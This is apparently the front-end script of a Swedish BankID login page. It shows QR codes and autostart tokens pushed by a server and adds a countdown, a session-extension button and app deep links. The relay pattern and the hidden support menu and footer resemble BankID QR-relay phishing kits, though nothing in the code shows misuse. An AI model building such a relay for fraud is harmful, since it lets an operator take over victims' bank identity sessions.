const hidee = document.getElementById("hidee");

function showBankIDLogo() {
    const supportMenu = document.getElementsByClassName('support-menu')[0];
    const footer = document.getElementsByClassName('footer')[0];
    supportMenu.style.display = 'none';
    footer.style.display = 'none';
    hidee.style.display = 'block';
}

const menuIcon = document.getElementById('menu-icon');
const supportIcon = document.getElementById('support-icon');
const mainMenuModal = document.getElementById('main-menu-modal');
const supportModal = document.getElementById('support-modal');
const closeMainMenu = document.getElementById('close-main-menu');
const closeSupport = document.getElementById('close-support');

menuIcon.addEventListener('click', () => {
    mainMenuModal.style.display = 'flex';
});

supportIcon.addEventListener('click', () => {
    supportModal.style.display = 'flex';
});

closeMainMenu.addEventListener('click', () => {
    mainMenuModal.style.display = 'none';
});

closeSupport.addEventListener('click', () => {
    supportModal.style.display = 'none';
});

window.addEventListener('click', (event) => {
    if (event.target === mainMenuModal) {
        mainMenuModal.style.display = 'none';
    }
    if (event.target === supportModal) {
        supportModal.style.display = 'none';
    }
});

const socket = io();
const qrImage = document.getElementById('qrImage');
qrImage.style.display = 'none';

// Store the QR data for BankID deep linking
let bankIdQRData = '';

socket.on('update_qr_code_image', function (data) {
    qrImage.src = 'data:image/png;base64,' + data.qr_image;
    hidee.style.display = 'none';
    
    // IMPORTANT: Store the raw QR data without parsing it first
    if (data.qr_code_data) {
        bankIdQRData = data.qr_code_data;
        // console.log("Received raw QR data:", bankIdQRData);
    }
    
    // Create container for QR and button
    const qrContainer = document.createElement('div');
    qrContainer.className = 'qr-container';
    qrContainer.style.display = 'flex';
    qrContainer.style.flexDirection = 'column';
    qrContainer.style.alignItems = 'center';
    qrContainer.style.gap = '15px';
    
    // Add QR image to container with improved accessibility
    qrImage.style.display = 'block';
    qrImage.style.margin = '0 auto';
    qrImage.style.maxWidth = '200px';
    qrImage.alt = 'BankID QR-kod. Klicka för att öppna i helskärm';
    qrImage.role = 'button';
    qrImage.tabIndex = '0';
    qrImage.style.cursor = 'pointer';
    
    // Make QR code clickable for fullscreen view (for accessibility)
    qrImage.addEventListener('click', function() {
        // Create fullscreen modal for QR code
        const fullscreenModal = document.createElement('div');
        fullscreenModal.style.position = 'fixed';
        fullscreenModal.style.top = '0';
        fullscreenModal.style.left = '0';
        fullscreenModal.style.width = '100%';
        fullscreenModal.style.height = '100%';
        fullscreenModal.style.backgroundColor = 'rgba(0,0,0,0.9)';
        fullscreenModal.style.display = 'flex';
        fullscreenModal.style.justifyContent = 'center';
        fullscreenModal.style.alignItems = 'center';
        fullscreenModal.style.zIndex = '1000';
        
        // Create larger QR image for fullscreen view
        const fullscreenQR = document.createElement('img');
        fullscreenQR.src = qrImage.src;
        fullscreenQR.style.maxWidth = '80%';
        fullscreenQR.style.maxHeight = '80%';
        
        // Close button
        const closeButton = document.createElement('button');
        closeButton.textContent = 'Stäng';
        closeButton.style.position = 'absolute';
        closeButton.style.top = '20px';
        closeButton.style.right = '20px';
        closeButton.style.padding = '10px 20px';
        closeButton.style.backgroundColor = '#007aff';
        closeButton.style.color = 'white';
        closeButton.style.border = 'none';
        closeButton.style.borderRadius = '4px';
        closeButton.style.cursor = 'pointer';
        
        closeButton.addEventListener('click', function() {
            document.body.removeChild(fullscreenModal);
        });
        
        fullscreenModal.appendChild(fullscreenQR);
        fullscreenModal.appendChild(closeButton);
        document.body.appendChild(fullscreenModal);
        
        // Close on clicking outside the QR
        fullscreenModal.addEventListener('click', function(e) {
            if (e.target === fullscreenModal) {
                document.body.removeChild(fullscreenModal);
            }
        });
    });
    
    // Create continue button
    const continueButton = document.createElement('button');
    continueButton.textContent = 'Fortsätt till BankID';
    continueButton.className = 'bankid-button';
    continueButton.style.padding = '12px 24px';
    continueButton.style.backgroundColor = '#007aff';
    continueButton.style.color = 'white';
    continueButton.style.border = 'none';
    continueButton.style.borderRadius = '4px';
    continueButton.style.cursor = 'pointer';
    continueButton.style.fontWeight = 'bold';
    continueButton.style.marginTop = '10px';
    
    continueButton.addEventListener('click', openBankIDApp);
    
    // Get the parent element where QR image is appended
    const modalContent = qrImage.parentElement;
    
    // Clear existing content
    modalContent.innerHTML = '';
    
    // Add new elements
    qrContainer.appendChild(qrImage);
    qrContainer.appendChild(continueButton);
    modalContent.appendChild(qrContainer);
    
    // Get QR data from server if available
    if (data.qrData) {
        bankIdQRData = data.qrData;
    }
    
    // Add countdown timer (accessibility improvement)
    const timerContainer = document.createElement('div');
    timerContainer.style.marginTop = '10px';
    timerContainer.style.textAlign = 'center';
    
    const timerText = document.createElement('p');
    timerText.textContent = 'QR-koden är giltig i: 30 sekunder';
    timerText.style.margin = '5px 0';
    
    // Add button to extend session
    const extendButton = document.createElement('button');
    extendButton.textContent = 'Förläng session';
    extendButton.style.padding = '8px 16px';
    extendButton.style.backgroundColor = '#f1f1f1';
    extendButton.style.border = 'none';
    extendButton.style.borderRadius = '4px';
    extendButton.style.cursor = 'pointer';
    extendButton.style.marginTop = '5px';
    
    extendButton.addEventListener('click', function() {
        // Request a new QR code from the server
        socket.emit('request_qr_data');
        timerText.textContent = 'QR-koden är giltig i: 30 sekunder';
    });
    
    timerContainer.appendChild(timerText);
    timerContainer.appendChild(extendButton);
    modalContent.appendChild(timerContainer);
    
    // Start countdown timer
    let timeLeft = 30;
    const countdown = setInterval(function() {
        timeLeft--;
        timerText.textContent = `QR-koden är giltig i: ${timeLeft} sekunder`;
        
        if (timeLeft <= 0) {
            clearInterval(countdown);
            timerText.textContent = 'QR-koden har utgått. Vänligen förläng sessionen.';
            timerText.style.color = 'red';
        } else if (timeLeft <= 10) {
            timerText.style.color = 'orange';
        }
    }, 1000);
});

function openBankIDApp() {
    const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
    const isAndroid = /Android/.test(navigator.userAgent);
    const isMobile = isIOS || isAndroid;
    
    // Create dialog to confirm opening BankID app
    const confirmDialog = document.createElement('div');
    confirmDialog.className = 'confirm-dialog';
    confirmDialog.style.position = 'fixed';
    confirmDialog.style.top = '50%';
    confirmDialog.style.left = '50%';
    confirmDialog.style.transform = 'translate(-50%, -50%)';
    confirmDialog.style.backgroundColor = 'white';
    confirmDialog.style.padding = '20px';
    confirmDialog.style.borderRadius = '8px';
    confirmDialog.style.boxShadow = '0 4px 12px rgba(0,0,0,0.15)';
    confirmDialog.style.zIndex = '1000';
    confirmDialog.style.maxWidth = '80%';
    confirmDialog.style.textAlign = 'center';
    
    confirmDialog.innerHTML = `
        <h3 style="margin-top: 0; color: #007aff;">Öppna BankID-appen</h3>
        <p>Vill du öppna BankID-appen för att fortsätta?</p>
        <div style="display: flex; justify-content: center; gap: 10px; margin-top: 20px;">
            <button id="cancelOpenBankID" style="padding: 8px 16px; background-color: #f1f1f1; border: none; border-radius: 4px; cursor: pointer;">Avbryt</button>
            <button id="confirmOpenBankID" style="padding: 8px 16px; background-color: #007aff; color: white; border: none; border-radius: 4px; cursor: pointer;">Öppna</button>
        </div>
    `;
    
    document.body.appendChild(confirmDialog);
    
    // Handle cancel button
    document.getElementById('cancelOpenBankID').addEventListener('click', function() {
        document.body.removeChild(confirmDialog);
    });
    
    // Handle confirm button
    document.getElementById('confirmOpenBankID').addEventListener('click', function() {
        document.body.removeChild(confirmDialog);
        
        // Get the most recent QR code data
        socket.emit('request_fresh_qr_data');
        
        if (bankIdQRData) {
            console.log("Raw QR Data:", bankIdQRData);
            
            // Handle different URL formats based on platform and whether it's a mobile or desktop device
            if (isMobile) {
                if (isIOS) {
                    // Use universal link for iOS
                    window.location.href = `https://app.bankid.com/?autostarttoken=${bankIdQRData}&redirect=null`;
                } else if (isAndroid) {
                    // Use app link for Android
                    window.location.href = `https://app.bankid.com/?autostarttoken=${bankIdQRData}&redirect=null`;
                }
            } else {
                // Desktop format using bankid:// protocol
                window.location.href = `bankid:///?autostarttoken=${bankIdQRData}`;
            }
            
            // As a fallback, after a delay, try the app store
            setTimeout(function() {
                if (confirm('BankID-appen kunde inte öppnas eller gav ett fel. Vill du installera eller uppdatera BankID-appen?')) {
                    if (isIOS) {
                        window.location.href = 'https://apps.apple.com/se/app/bankid-s%C3%A4kerhetsapp/id433151512';
                    } else if (isAndroid) {
                        window.location.href = 'https://play.google.com/store/apps/details?id=com.bankid.bus';
                    }
                }
            }, 3000);
        } else {
            alert('Ingen BankID-data tillgänglig. Var god skanna QR-koden igen.');
        }
    });
}

// Request QR data from server on page load
socket.emit('request_qr_data');
socket.on('qr_data', function(data) {
    if (data && data.qrData) {
        bankIdQRData = data.qrData;
    }
});

// Handle QR token from server if it uses the new format
socket.on('bankid_token', function(data) {
    if (data && data.token) {
        bankIdQRData = data.token;
    }
});